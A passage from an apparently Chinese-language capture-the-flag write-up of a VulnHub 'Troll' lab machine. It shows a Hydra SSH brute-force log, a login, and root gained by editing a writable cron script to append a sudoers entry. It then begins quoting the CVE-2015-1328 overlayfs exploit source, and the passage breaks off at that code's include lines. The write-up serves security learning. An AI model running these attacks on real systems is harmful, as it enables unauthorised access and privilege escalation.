class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/vulnhub/troll<span class="comment"># hydra -s 22 -v -V -L users -P pass -e n -t 1 -w 30 192.168.66.15 ssh</span></span><br><span class="line">Hydra v9.0 (c) 2019 by van Hauser/THC - Please <span class="keyword">do</span> not use <span class="keyword">in</span> military or secret service organizations, or <span class="keyword">for</span> illegal purposes.</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-03-31 03:34:11</span><br><span class="line">[DATA] max 1 task per 1 server, overall 1 task, 20 login tries (l:10/p:2), ~20 tries per task</span><br><span class="line">[DATA] attacking ssh://192.168.66.15:22/</span><br><span class="line">[VERBOSE] Resolving addresses ... [VERBOSE] resolving <span class="keyword">done</span></span><br><span class="line">[INFO] Testing <span class="keyword">if</span> password authentication is supported by ssh://maleus@192.168.66.15:22</span><br><span class="line">[INFO] Successful, password authentication is supported by ssh://192.168.66.15:22</span><br><span class="line">[ATTEMPT] target 192.168.66.15 - login <span class="string">&quot;maleus&quot;</span> - pass <span class="string">&quot;&quot;</span> - 1 of 20 [child 0] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.66.15 - login <span class="string">&quot;maleus&quot;</span> - pass <span class="string">&quot;Good_job_:)&quot;</span> - 2 of 20 [child 0] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.66.15 - login <span class="string">&quot;ps-aux&quot;</span> - pass <span class="string">&quot;&quot;</span> - 3 of 20 [child 0] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.66.15 - login <span class="string">&quot;ps-aux&quot;</span> - pass <span class="string">&quot;Good_job_:)&quot;</span> - 4 of 20 [child 0] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.66.15 - login <span class="string">&quot;felux&quot;</span> - pass <span class="string">&quot;&quot;</span> - 5 of 20 [child 0] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.66.15 - login <span class="string">&quot;felux&quot;</span> - pass <span class="string">&quot;Good_job_:)&quot;</span> - 6 of 20 [child 0] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.66.15 - login <span class="string">&quot;Eagle11&quot;</span> - pass <span class="string">&quot;&quot;</span> - 7 of 20 [child 0] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.66.15 - login <span class="string">&quot;Eagle11&quot;</span> - pass <span class="string">&quot;Good_job_:)&quot;</span> - 8 of 20 [child 0] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.66.15 - login <span class="string">&quot;genphlux&quot;</span> - pass <span class="string">&quot;&quot;</span> - 9 of 20 [child 0] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.66.15 - login <span class="string">&quot;genphlux&quot;</span> - pass <span class="string">&quot;Good_job_:)&quot;</span> - 10 of 20 [child 0] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.66.15 - login <span class="string">&quot;usmc8892&quot;</span> - pass <span class="string">&quot;&quot;</span> - 11 of 20 [child 0] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.66.15 - login <span class="string">&quot;usmc8892&quot;</span> - pass <span class="string">&quot;Good_job_:)&quot;</span> - 12 of 20 [child 0] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.66.15 - login <span class="string">&quot;blawrg&quot;</span> - pass <span class="string">&quot;&quot;</span> - 13 of 20 [child 0] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.66.15 - login <span class="string">&quot;blawrg&quot;</span> - pass <span class="string">&quot;Good_job_:)&quot;</span> - 14 of 20 [child 0] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.66.15 - login <span class="string">&quot;wytshadow&quot;</span> - pass <span class="string">&quot;&quot;</span> - 15 of 20 [child 0] (0/0)</span><br><span class="line">[ERROR] could not connect to target port 22: Connection refused</span><br><span class="line">[ERROR] ssh protocol error</span><br><span class="line">[VERBOSE] Retrying connection <span class="keyword">for</span> child 0</span><br><span class="line">[RE-ATTEMPT] target 192.168.66.15 - login <span class="string">&quot;wytshadow&quot;</span> - pass <span class="string">&quot;&quot;</span> - 15 of 20 [child 0] (0/0)</span><br><span class="line">[ERROR] could not connect to target port 22: Connection refused</span><br><span class="line">[ERROR] ssh protocol error</span><br><span class="line">[VERBOSE] Retrying connection <span class="keyword">for</span> child 0</span><br><span class="line">[RE-ATTEMPT] target 192.168.66.15 - login <span class="string">&quot;wytshadow&quot;</span> - pass <span class="string">&quot;&quot;</span> - 15 of 20 [child 0] (0/0)</span><br><span class="line">[ERROR] could not connect to target port 22: Connection refused</span><br><span class="line">[ERROR] ssh protocol error</span><br><span class="line">[VERBOSE] Retrying connection <span class="keyword">for</span> child 0</span><br><span class="line">[RE-ATTEMPT] target 192.168.66.15 - login <span class="string">&quot;wytshadow&quot;</span> - pass <span class="string">&quot;&quot;</span> - 15 of 20 [child 0] (0/0)</span><br><span class="line">[ERROR] could not connect to target port 22: Connection refused</span><br><span class="line">[ERROR] ssh protocol error</span><br><span class="line">[VERBOSE] Retrying connection <span class="keyword">for</span> child 0</span><br><span class="line">[RE-ATTEMPT] target 192.168.66.15 - login <span class="string">&quot;wytshadow&quot;</span> - pass <span class="string">&quot;&quot;</span> - 15 of 20 [child 0] (0/0)</span><br><span class="line">[ERROR] could not connect to target port 22: Connection refused</span><br><span class="line">[ERROR] ssh protocol error</span><br><span class="line">[VERBOSE] Retrying connection <span class="keyword">for</span> child 0</span><br><span class="line">[RE-ATTEMPT] target 192.168.66.15 - login <span class="string">&quot;wytshadow&quot;</span> - pass <span class="string">&quot;&quot;</span> - 15 of 20 [child 0] (0/0)</span><br><span class="line">[ERROR] could not connect to target port 22: Connection refused</span><br><span class="line">[ERROR] ssh protocol error</span><br><span class="line">[VERBOSE] Retrying connection <span class="keyword">for</span> child 0</span><br><span class="line">[RE-ATTEMPT] target 192.168.66.15 - login <span class="string">&quot;wytshadow&quot;</span> - pass <span class="string">&quot;&quot;</span> - 15 of 20 [child 0] (0/0)</span><br><span class="line">[ERROR] could not connect to target port 22: Connection refused</span><br><span class="line">[ERROR] ssh protocol error</span><br><span class="line">[VERBOSE] Retrying connection <span class="keyword">for</span> child 0</span><br><span class="line">[RE-ATTEMPT] target 192.168.66.15 - login <span class="string">&quot;wytshadow&quot;</span> - pass <span class="string">&quot;&quot;</span> - 15 of 20 [child 0] (0/0)</span><br><span class="line">[ERROR] could not connect to target port 22: Connection refused</span><br><span class="line">[ERROR] ssh protocol error</span><br><span class="line">[VERBOSE] Retrying connection <span class="keyword">for</span> child 0</span><br><span class="line">[RE-ATTEMPT] target 192.168.66.15 - login <span class="string">&quot;wytshadow&quot;</span> - pass <span class="string">&quot;&quot;</span> - 15 of 20 [child 0] (0/0)</span><br><span class="line">[ERROR] could not connect to target port 22: Connection refused</span><br><span class="line">[ERROR] ssh protocol error</span><br><span class="line">[VERBOSE] Retrying connection <span class="keyword">for</span> child 0</span><br><span class="line">[RE-ATTEMPT] target 192.168.66.15 - login <span class="string">&quot;wytshadow&quot;</span> - pass <span class="string">&quot;&quot;</span> - 15 of 20 [child 0] (0/0)</span><br><span class="line">[ERROR] could not connect to target port 22: Connection refused</span><br><span class="line">[ERROR] ssh protocol error</span><br><span class="line">[VERBOSE] Retrying connection <span class="keyword">for</span> child 0</span><br><span class="line">[RE-ATTEMPT] target 192.168.66.15 - login <span class="string">&quot;wytshadow&quot;</span> - pass <span class="string">&quot;&quot;</span> - 15 of 20 [child 0] (0/0)</span><br><span class="line">[ERROR] could not connect to target port 22: Connection refused</span><br><span class="line">[ERROR] ssh protocol error</span><br><span class="line">[VERBOSE] Retrying connection <span class="keyword">for</span> child 0</span><br><span class="line">[RE-ATTEMPT] target 192.168.66.15 - login <span class="string">&quot;wytshadow&quot;</span> - pass <span class="string">&quot;&quot;</span> - 15 of 20 [child 0] (0/0)</span><br><span class="line">[ERROR] could not connect to target port 22: Connection refused</span><br><span class="line">[ERROR] ssh protocol error</span><br><span class="line">[VERBOSE] Retrying connection <span class="keyword">for</span> child 0</span><br><span class="line">[RE-ATTEMPT] target 192.168.66.15 - login <span class="string">&quot;wytshadow&quot;</span> - pass <span class="string">&quot;&quot;</span> - 15 of 20 [child 0] (0/0)</span><br><span class="line">[ERROR] could not connect to target port 22: Connection refused</span><br><span class="line">[ERROR] ssh protocol error</span><br><span class="line">[VERBOSE] Retrying connection <span class="keyword">for</span> child 0</span><br><span class="line">[RE-ATTEMPT] target 192.168.66.15 - login <span class="string">&quot;wytshadow&quot;</span> - pass <span class="string">&quot;&quot;</span> - 15 of 20 [child 0] (0/0)</span><br><span class="line">[ERROR] could not connect to target port 22: Connection refused</span><br><span class="line">[ERROR] ssh protocol error</span><br><span class="line">[VERBOSE] Retrying connection <span class="keyword">for</span> child 0</span><br><span class="line">[RE-ATTEMPT] target 192.168.66.15 - login <span class="string">&quot;wytshadow&quot;</span> - pass <span class="string">&quot;&quot;</span> - 15 of 20 [child 0] (0/0)</span><br><span class="line">[ERROR] could not connect to target port 22: Connection refused</span><br><span class="line">[ERROR] ssh protocol error</span><br><span class="line">[ATTEMPT] target 192.168.66.15 - login <span class="string">&quot;wytshadow&quot;</span> - pass <span class="string">&quot;Good_job_:)&quot;</span> - 16 of 21 [child 0] (0/1)</span><br><span class="line">[ERROR] could not connect to target port 22: Connection refused</span><br><span class="line">[ERROR] ssh protocol error</span><br><span class="line">[ATTEMPT] target 192.168.66.15 - login <span class="string">&quot;vis1t0r&quot;</span> - pass <span class="string">&quot;&quot;</span> - 17 of 22 [child 0] (0/2)</span><br><span class="line">[ERROR] could not connect to target port 22: Connection refused</span><br><span class="line">[ERROR] ssh protocol error</span><br><span class="line">[ATTEMPT] target 192.168.66.15 - login <span class="string">&quot;vis1t0r&quot;</span> - pass <span class="string">&quot;Good_job_:)&quot;</span> - 18 of 23 [child 0] (0/3)</span><br><span class="line">[ERROR] could not connect to target port 22: Connection refused</span><br><span class="line">[ERROR] ssh protocol error</span><br><span class="line">[ATTEMPT] target 192.168.66.15 - login <span class="string">&quot;overflow&quot;</span> - pass <span class="string">&quot;&quot;</span> - 19 of 23 [child 0] (0/3)</span><br><span class="line">[ERROR] could not connect to target port 22: Connection refused</span><br><span class="line">[ERROR] ssh protocol error</span><br><span class="line">[ATTEMPT] target 192.168.66.15 - login <span class="string">&quot;overflow&quot;</span> - pass <span class="string">&quot;Good_job_:)&quot;</span> - 20 of 23 [child 0] (0/3)</span><br><span class="line">[ERROR] could not connect to target port 22: Connection refused</span><br><span class="line">[ERROR] ssh protocol error</span><br><span class="line">[REDO-ATTEMPT] target 192.168.66.15 - login <span class="string">&quot;wytshadow&quot;</span> - pass <span class="string">&quot;&quot;</span> - 21 of 23 [child 0] (1/3)</span><br><span class="line">[ERROR] could not connect to target port 22: Connection refused</span><br><span class="line">[ERROR] ssh protocol error</span><br><span class="line">[REDO-ATTEMPT] target 192.168.66.15 - login <span class="string">&quot;wytshadow&quot;</span> - pass <span class="string">&quot;Good_job_:)&quot;</span> - 22 of 23 [child 0] (2/3)</span><br><span class="line">[ERROR] could not connect to target port 22: Connection refused</span><br><span class="line">[ERROR] ssh protocol error</span><br><span class="line">[REDO-ATTEMPT] target 192.168.66.15 - login <span class="string">&quot;vis1t0r&quot;</span> - pass <span class="string">&quot;&quot;</span> - 23 of 23 [child 0] (3/3)</span><br><span class="line">[ERROR] could not connect to target port 22: Connection refused</span><br><span class="line">[ERROR] ssh protocol error</span><br><span class="line">[STATUS] attack finished <span class="keyword">for</span> 192.168.66.15 (waiting <span class="keyword">for</span> children to complete tests)</span><br><span class="line">1 of 1 target completed, 0 valid passwords found</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-03-31 03:34:49</span><br></pre></td></tr></table></figure>
+
+<p>问题始于用户blawrg，如果hydra无法登录，则主机将阻止Kali的IP。必须更改Kali的IP，然后才能开始尝试新用户。爆破完成，但是没有用户可以登录。</p>
+<p>注意到包含Pass.txt的目录是this_folder_contains_the_password。这可能意味着某些情况，因此再次尝试使用Pass.txt作为密码，但溢出后可以使用密码WTH！登录。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[RE-ATTEMPT] target 192.168.66.15 - login <span class="string">&quot;vis1t0r&quot;</span> - pass <span class="string">&quot;&quot;</span> - 16 of 20 [child 2] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.66.15 - login <span class="string">&quot;vis1t0r&quot;</span> - pass <span class="string">&quot;&quot;</span> - 17 of 20 [child 0] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.66.15 - login <span class="string">&quot;vis1t0r&quot;</span> - pass <span class="string">&quot;Pass.txt&quot;</span> - 18 of 20 [child 2] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.66.15 - login <span class="string">&quot;overflow&quot;</span> - pass <span class="string">&quot;&quot;</span> - 19 of 20 [child 0] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.66.15 - login <span class="string">&quot;overflow&quot;</span> - pass <span class="string">&quot;Pass.txt&quot;</span> - 20 of 20 [child 0] (0/0)</span><br><span class="line">[22][ssh] host: 192.168.66.15   login: overflow   password: Pass.txt</span><br><span class="line">[STATUS] attack finished <span class="keyword">for</span> 192.168.66.15 (waiting <span class="keyword">for</span> children to complete tests)</span><br><span class="line">1 of 1 target successfully completed, 1 valid password found</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-03-31 03:41:02</span><br></pre></td></tr></table></figure>
+
+<p>成功登录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># ssh overflow@192.168.66.15</span></span><br><span class="line">Enter passphrase <span class="keyword">for</span> key <span class="string">&#x27;/root/.ssh/id_rsa&#x27;</span>: </span><br><span class="line">overflow@192.168.66.15<span class="string">&#x27;s password: </span></span><br><span class="line"><span class="string">Permission denied, please try again.</span></span><br><span class="line"><span class="string">overflow@192.168.66.15&#x27;</span>s password: </span><br><span class="line">Welcome to Ubuntu 14.04.1 LTS (GNU/Linux 3.13.0-32-generic i686)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com/</span><br><span class="line">New release <span class="string">&#x27;16.04.6 LTS&#x27;</span> available.</span><br><span class="line">Run <span class="string">&#x27;do-release-upgrade&#x27;</span> to upgrade to it.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">The programs included with the Ubuntu system are free software;</span><br><span class="line">the exact distribution terms <span class="keyword">for</span> each program are described <span class="keyword">in</span> the</span><br><span class="line">individual files <span class="keyword">in</span> /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by</span><br><span class="line">applicable law.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">The programs included with the Ubuntu system are free software;</span><br><span class="line">the exact distribution terms <span class="keyword">for</span> each program are described <span class="keyword">in</span> the</span><br><span class="line">individual files <span class="keyword">in</span> /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by</span><br><span class="line">applicable law.</span><br><span class="line"></span><br><span class="line">Last login: Wed Aug 13 01:14:09 2014 from 10.0.0.12</span><br><span class="line">Could not <span class="built_in">chdir</span> to home directory /home/overflow: No such file or directory</span><br><span class="line">$ <span class="built_in">id</span></span><br><span class="line">uid=1002(overflow) gid=1002(overflow) <span class="built_in">groups</span>=1002(overflow)</span><br><span class="line">$ <span class="built_in">whoami</span></span><br><span class="line">overflow</span><br></pre></td></tr></table></figure>
+
+<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>登录后，尝试找到该flag，但找不到。由于overflow是低权限用户，因此必须提权并找到root flag，然后再访问更多目录。</p>
+<ul>
+<li>已经检查crontabs，并且没有文件可写。</li>
+<li>tmp目录为空</li>
+</ul>
+<p>我开始在var&#x2F;中检查world可写文件。没有有趣的文件，但是只有一个。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ l_path=var/*/*;<span class="keyword">while</span> [ <span class="string">&quot;<span class="variable">$l_path</span>&quot;</span> != / -a <span class="string">&quot;<span class="variable">$l_path</span>&quot;</span> != . ]; <span class="keyword">do</span> <span class="built_in">ls</span> -ld <span class="variable">$l_path</span>; l_path=$(<span class="built_in">dirname</span> -- <span class="string">&quot;<span class="variable">$l_path</span>&quot;</span>);<span class="keyword">done</span>;</span><br><span class="line">...</span><br><span class="line">-rwxrwxrwx  1 root       root            23 Aug 13  2014 var/log/cronlog</span><br><span class="line">...</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>检查var&#x2F;log&#x2F;cronlog</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cat</span> var/log/cronlog</span><br><span class="line">*/2 * * * * cleaner.py</span><br></pre></td></tr></table></figure>
+
+<p>这是cron job，每2分钟运行一次。如果可以修改cleaner.py并让系统做点什么，那么就可以升级overflow的权限。但是首先，必须找到cleaner.py。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ find / -name cleaner.py 2&gt;/dev/null | grep <span class="string">&quot;cleaner.py&quot;</span></span><br><span class="line">/lib/log/cleaner.py</span><br></pre></td></tr></table></figure>
+
+<p>查看cleaner.py</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cat</span> /lib/log/cleaner.py</span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line">import os</span><br><span class="line">import sys</span><br><span class="line">try:</span><br><span class="line">        os.system(<span class="string">&#x27;rm -r /tmp/* &#x27;</span>)</span><br><span class="line">except:</span><br><span class="line">        sys.exit()</span><br></pre></td></tr></table></figure>
+
+<p>找到了python文件，它是可写的。</p>
+<ul>
+<li>修改cleaner.py</li>
+</ul>
+<p>通过向帐户溢出添加sudo su	权限来修改了cleaner.py。当执行bash命令sudo su时，会得到root shell。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">overflow@troll:/$ <span class="built_in">cat</span> /lib/log/cleaner.py</span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line">import os</span><br><span class="line">import sys</span><br><span class="line">try:</span><br><span class="line">        os.system(<span class="string">&#x27;echo &quot;overflow ALL=(ALL:ALL) ALL&quot; &gt;&gt; /etc/sudoers&#x27;</span>)</span><br><span class="line">except:</span><br><span class="line">        sys.exit()</span><br></pre></td></tr></table></figure>
+
+<p>等待2分钟…。靶机将我踢了出去，再次登录并可升级为root。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$ sudo su</span><br><span class="line"></span><br><span class="line">[sudo] password <span class="keyword">for</span> overflow: </span><br><span class="line">Sorry, try again.</span><br><span class="line">[sudo] password <span class="keyword">for</span> overflow: </span><br><span class="line">root@troll:/<span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root)</span><br><span class="line">root@troll:/<span class="comment"># whoami</span></span><br><span class="line">root</span><br><span class="line">root@troll:/<span class="comment"># pwd</span></span><br><span class="line">/</span><br><span class="line">root@troll:/<span class="comment"># cd /root</span></span><br><span class="line">root@troll:~<span class="comment"># ls</span></span><br><span class="line">proof.txt</span><br><span class="line">root@troll:~<span class="comment"># cat proof.txt</span></span><br><span class="line">Good job, you did it! </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">702a8c18d29c6f3ca0d99ef5712bfbdc</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub232.jpg"></li>
+</ul>
+<h3 id="提权2"><a href="#提权2" class="headerlink" title="提权2"></a>提权2</h3><p>linux 内核提权</p>
+<p>参考<span class="exturl" data-url="aHR0cHM6Ly93d3cuZXhwbG9pdC1kYi5jb20vZXhwbG9pdHMvMzcyOTI=">Linux-Kernel-3.13.0-3.19-Ubuntu-12.04&#x2F;14.04&#x2F;14.10&#x2F;15.04-‘overlayfs’-Local-Privilege-Escalation<i class="fa fa-external-link-alt"></i></span></p>
+<ul>
+<li>CVE : CVE-2015-1328</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line"><span class="comment"># Exploit Title: ofs.c - overlayfs local root in ubuntu</span></span><br><span class="line"><span class="comment"># Date: 2015-06-15</span></span><br><span class="line"><span class="comment"># Exploit Author: rebel</span></span><br><span class="line"><span class="comment"># Version: Ubuntu 12.04, 14.04, 14.10, 15.04 (Kernels before 2015-06-15)</span></span><br><span class="line"><span class="comment"># Tested on: Ubuntu 12.04, 14.04, 14.10, 15.04</span></span><br><span class="line"><span class="comment"># CVE : CVE-2015-1328     (http://people.canonical.com/~ubuntu-security/cve/2015/CVE-2015-1328.html)</span></span><br><span class="line"></span><br><span class="line">*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*</span><br><span class="line">CVE-2015-1328 / ofs.c</span><br><span class="line">overlayfs incorrect permission handling + FS_USERNS_MOUNT</span><br><span class="line"></span><br><span class="line">user@ubuntu-server-1504:~$ <span class="built_in">uname</span> -a</span><br><span class="line">Linux ubuntu-server-1504 3.19.0-18-generic <span class="comment">#18-Ubuntu SMP Tue May 19 18:31:35 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux</span></span><br><span class="line">user@ubuntu-server-1504:~$ gcc ofs.c -o ofs</span><br><span class="line">user@ubuntu-server-1504:~$ <span class="built_in">id</span></span><br><span class="line">uid=1000(user) gid=1000(user) <span class="built_in">groups</span>=1000(user),24(cdrom),30(dip),46(plugdev)</span><br><span class="line">user@ubuntu-server-1504:~$ ./ofs</span><br><span class="line">spawning threads</span><br><span class="line">mount <span class="comment">#1</span></span><br><span class="line">mount <span class="comment">#2</span></span><br><span class="line">child threads <span class="keyword">done</span></span><br><span class="line">/etc/ld.so.preload created</span><br><span class="line">creating shared library</span><br><span class="line"><span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root),24(cdrom),30(dip),46(plugdev),1000(user)</span><br><span class="line"></span><br><span class="line">greets to beist &amp; kaliman</span><br><span class="line">2015-05-24</span><br><span class="line">%rebel%</span><br><span class="line">*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;unistd.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sched.h&gt;</span></span><br><span 